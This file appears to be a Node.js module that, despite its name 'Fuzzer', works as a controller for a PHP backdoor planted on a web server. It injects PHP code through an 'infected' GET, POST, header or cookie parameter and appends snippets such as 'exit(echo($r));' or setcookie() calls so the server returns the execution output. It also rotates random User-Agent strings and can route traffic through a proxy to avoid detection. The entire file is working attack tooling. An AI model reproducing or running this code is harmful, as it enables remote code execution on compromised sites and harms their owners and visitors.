let ApiCaller = require('request');
let UserAgent = require('random-useragent');

/*
 * @param {object} config = configuration of Fuzzer
 *
 * @config_param string Host = target URL
 * @config_param int Method = Http method for request [0: GET, 1: POST, 2: HEADER, 3: COOKIE]
 * @config_param string Parameter = Infected parameters
 * @config_param int Crypt = Is it a crypted request
 * 
 * {object} callbacks = Default callbacks methods
 * string httpMethod = Http method for request 
 * {object} request = current request
 */
function Fuzzer(config) {
	this.host = config.host;
	this.method = parseInt(config.method);
	this.parameter = config.parameter || "Dec";
	this.crypt = config.crypt;
	this.callbacks = {
		onSuccess: this.handleSuccess,
		onError: this.handleError
	};

	this.httpMethod = this.getHttpMethod();
	this.request = {
		url: this.host,
		method: this.httpMethod,
		headers: {},
		form: {},
		jar: {},
		proxy: config.proxy
	};
}

Fuzzer.prototype.getHandleback = function getHandleback() {
	let response;

	switch(this.method) {
		case 0:
		case 1:
			response = "exit(echo($r));";
			break;
		case 2: 
			response = "header('" + this.parameter + ":' . $r);";
			break;
		case 3:
			response = "setcookie('" + this.parameter + "', $r);";
			break;
	}

	return response;
}

Fuzzer.prototype.getHttpMethod = function getHttpMethod() {
	if(this.method == 1) {
		return "POST"
	}

	return "GET";
}

Fuzzer.prototype.prepare = function prepare(r) {
	let request = this.request;

	request.headers["User-Agent"] = UserAgent.getRandom();
	r = r + this.getHandleback();

	switch(this.method) {
		case 0: //GET
			request.url = this.host + "?" + this.parameter + "=" + encodeURIComponent(r);
			break;
		case 1: //POST
			request.form[this.parameter] = r;
			break;
		case 2: //Header
			request.headers[this.parameter] = r;
			break;
		case 3: //Cookie
			let j = ApiCaller.jar(); 
			let cookie = ApiCaller.cookie(this.parameter + '=' + encodeURIComponent(r));
			j.setCookie(cookie, this.host);
			
			request.jar = j;
			break;
	}

	return request;
}

Fuzzer.prototype.send = function send(r, onSuccess, onError) {
	var self = this;

	if(typeof r === 'object') {
		this.request = r;
	}
	else if(typeof r === 'string') {
		this.request = this.prepare(r);
	}
	else {
		logger.log("Error", "Request is not valid");
		return;
	}

	logger.log("info", "Final request is set");
	logger.log("info", "", this.request);

	if(typeof onSuccess == "function") {
		this.callbacks.onSuccess = onSuccess;
	}

	if(typeof onError == "function") {
		this.callbacks.onError = onError;
	}

	ApiCaller(this.request, function(error, response, body) {
		if(!error && response.statusCode == 200) {
			logger.log("info", "Response(obj): ", response);
			logger.log("info", "Response(body): ", body);

			if(self.request.jar instanceof ApiCaller.jar) {
				logger.log("info", "Response(cookies): ", self.request.jar.getCookies(self.host));
			}

			return self.callbacks.onSuccess(response, body, self);
		}

		logger.log("error", "Error: %j", error);
		return self.callbacks.onError(error, response, body, self);
	});
}

Fuzzer.prototype.handleSuccess = function handleSuccess(response, body, ref) {
}

Fuzzer.prototype.handleError = function handleError(error, response, body, ref) {
}

module.exports = Fuzzer;
